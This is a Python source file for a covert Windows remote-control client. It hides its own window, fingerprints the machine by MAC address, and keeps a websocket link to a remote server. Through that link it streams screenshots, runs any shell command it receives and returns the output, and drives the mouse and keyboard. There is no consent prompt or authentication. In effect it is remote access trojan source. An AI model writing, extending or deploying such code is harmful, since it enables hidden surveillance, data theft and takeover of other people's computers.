import os
import re
import base64
import pyperclip
import websocket
import _thread
import threading
import time
import rel
import json
from mss import mss
import mss.tools
import pyautogui, sys
pyautogui.FAILSAFE = False
streaming = False
streamThread = None
ping_thread = None
import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)



    


mac = False
stream = os.popen('getmac /v')
output = stream.read()
## loop thru each line of output and split each line into words
p = re.compile(r'((?:[\da-fA-F]{2}[:\-]){5}[\da-fA-F]{2})', re.IGNORECASE)
macs = re.findall(p, output)
mac = macs[0]

def on_message(ws, message):
    i = json.loads(message)
    #switch statement for type
    if i["type"] == "screen-start":
        global streaming
        global streamThread
        streaming = True
        starttime = time.time()
        def stream_screen():
            def shoot():
                with mss.mss() as sct:
                #compress screenshot
                    sct.compression_level = 9
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    raw_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                    tag = 5
                    tag_bytes = tag.to_bytes(1, byteorder='big')
                    return tag_bytes + raw_bytes
            global streaming
            global streamThread
            while streaming:
                img = shoot()
                ws.send(img, opcode=websocket.ABNF.OPCODE_BINARY)
                #calculate fps and print it

                time.sleep(0.2)
        if(streamThread == None):
            streamThread = threading.Thread(target=stream_screen)
            streamThread.start()
        elif(streamThread.is_alive() == False):
            streamThread = threading.Thread(target=stream_screen)
            streamThread.start()
    elif i["type"] == "screen-stop":
        #stop screen stream
        streaming = False
        streamThread.join()
        print("Screen stream stopped")
    elif i["type"] == "command":
        #execute command
        resp = os.popen(i["cmd"]).read()
        ws.send(json.dumps(obj={"type": "command-response", "data": resp}))
    elif i["type"] == "click":
        #click
        print("Click")
        x = i["data"]["x"]
        y = i["data"]["y"]
        # print x and y
        pyautogui.click()
    elif i["type"] == "doubleclick":
        #doubleclick
        print("Doubleclick")
        x = i["data"]["x"]
        y = i["data"]["y"]
        # print x and y
        pyautogui.doubleClick()
    elif i["type"] == "key":
        #key
        print("Key")
        key = i["data"]["key"]
        # print key
        pyautogui.press(key)
    elif i["type"] == "move":
        #move
        print("Move"+str(i["data"]["x"])+" "+str(i["data"]["y"]))
        x = i["data"]["x"]
        y = i["data"]["y"]
        # print x and y
        pyautogui.moveTo(x, y)
    elif i["type"] == "keypress":
        #keypress
        print("Keypress")
        key = i["data"]["key"]
        # print key
        pyautogui.keyDown(key)
        pyautogui.keyUp(key)
        

        





def on_error(ws, error):
    if ping_thread != None:
        ping_thread.join()
    print(error)


def on_close(ws, close_status_code, close_msg):
    print("### closed ###")
    ping_thread.join()

def on_open(ws):
    print("Opened connection")
    starttime = time.time()
    data = {
        "type":"handshake",
        "data":mac,
        "py":True
    }
    ws.send(json.dumps(data))
    def run(*args):
        while True:
            ws.send(json.dumps(obj={"type": "ping"}))
            time.sleep(5.0 - ((time.time() - starttime) % 5.0))
    ping_thread = _thread.start_new_thread(run, ())
    ## send json data to server
#enable debugging
#websocket.enableTrace(True)
def connect():
    while True:
            try:
                ws = websocket.WebSocketApp("ws://vpn-ip:8080",
                                        on_open=on_open,
                                        on_message=on_message,
                                        on_error=on_error,
                                        on_close=on_close)

                ws.run_forever(skip_utf8_validation=True,ping_interval=10,ping_timeout=8) # Set dispatcher to automatic reconnection
            except Exception as e:
                print("Websocket connection Error  : {0}".format(e))                    
                print("Reconnecting websocket  after 5 sec")
                time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=connect, args=()).start()
